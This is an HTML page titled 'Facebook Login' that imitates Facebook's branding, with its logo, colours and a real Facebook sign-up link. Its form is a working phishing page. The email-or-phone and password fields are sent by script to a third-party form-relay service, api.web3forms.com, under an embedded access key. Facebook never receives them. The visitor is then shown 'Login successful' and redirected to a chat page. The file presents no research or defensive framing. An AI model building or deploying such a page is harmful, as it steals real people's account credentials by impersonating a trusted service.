<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        padding: 0;
        font-family: 'Helvetica Neue', Arial, sans-serif;
        background-color: #181818; /* Dark background */
        color: #fff; /* Light text */
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
      }

      .login-container {
        width: 90%;
        max-width: 360px;
        padding: 40px;
        background-color: #fff; /* White background for the form */
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        text-align: center;
      }

      .facebook-logo {
        margin-bottom: 20px;
      }

      .facebook-logo img {
        width: 120px;
        height: auto;
      }

      h1 {
        color: #1877f2; /* Facebook blue */
        font-size: 36px;
        margin-bottom: 20px;
        font-weight: bold;
      }

      form {
        display: flex;
        flex-direction: column;
      }

      input {
        width: 100%;
        padding: 12px;
        margin: 8px 0;
        font-size: 16px;
        border: 1px solid #ccc; /* Lighter border */
        border-radius: 6px;
        background-color: #f4f4f4; /* Light input background */
        color: #000; /* Dark text inside input */
        transition: border-color 0.3s;
      }

      input:focus {
        border-color: #1877f2; /* Facebook blue */
        outline: none;
      }

      button {
        width: 100%;
        padding: 12px;
        font-size: 18px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        background-color: #1877f2; /* Facebook blue */
        color: white;
        font-weight: bold;
        margin-top: 10px;
        transition: background-color 0.3s;
      }

      button:hover {
        background-color: #145dbf; /* Darker Facebook blue */
      }

      .create-account {
        margin-top: 20px;
        font-size: 14px;
      }

      .create-account a {
        color: #1877f2; /* Facebook blue */
        text-decoration: none;
        font-weight: bold;
      }

      #result {
        margin-top: 15px;
        color: red;
      }
    </style>
  </head>
  <body>
    <div class="login-container" id="login-container">
      <div class="facebook-logo">
        <img src="/img/download.png" alt="Facebook Logo">
      </div>
      <h1>Login</h1>
      <form method="POST" id="form">
        <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
        <input type="email" name="Email or phone" placeholder="Email or Phone" required>
        <input type="password" name="P4$$W0RD" placeholder="Password" required>
        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
        <button type="submit">Log In</button>
        <div class="create-account">
          <p><a href="https://m.facebook.com/reg/">Create new account</a></p>
        </div>
        <div id="result"></div>
      </form>
    </div>
    <script>
      const form = document.getElementById('form');
      const result = document.getElementById('result');
      const loginContainer = document.getElementById('login-container');

      let loggedIn = localStorage.getItem('loggedIn') === 'true'; // Check if user is logged in

      // Check if user is already logged in on page load
      if (loggedIn) {
        loginContainer.style.display = "none"; // Hide login container
        // Redirect to chat page after successful login
        window.location.href = 'chat.html'; // Change 'chat.html' to your chat page URL
      }

      form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Check if user is already logged in
        if (loggedIn) {
          result.innerHTML = "You are already logged in.";
          return; // Prevent further processing
        }

        const formData = new FormData(form);
        const object = Object.fromEntries(formData);
        const json = JSON.stringify(object);
        result.innerHTML = "";

        fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: json
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                loggedIn = true; // Set loggedIn to true on successful login
                localStorage.setItem('loggedIn', 'true'); // Save login status in local storage
                loginContainer.style.display = "none"; // Hide login on success
                result.innerHTML = "Login successful!";
                // Redirect to chat page after successful login
                window.location.href = '/chat.html'; // Change 'chat.html' to your chat page URL
            } else {
                result.innerHTML = "Login failed. Please try again.";
            }
        })
        .catch(error => {
            result.innerHTML = "Please open your internet once Login you can turn it off.";
            console.error('Error:', error);
        });
      });
    </script>
  </body>
</html>
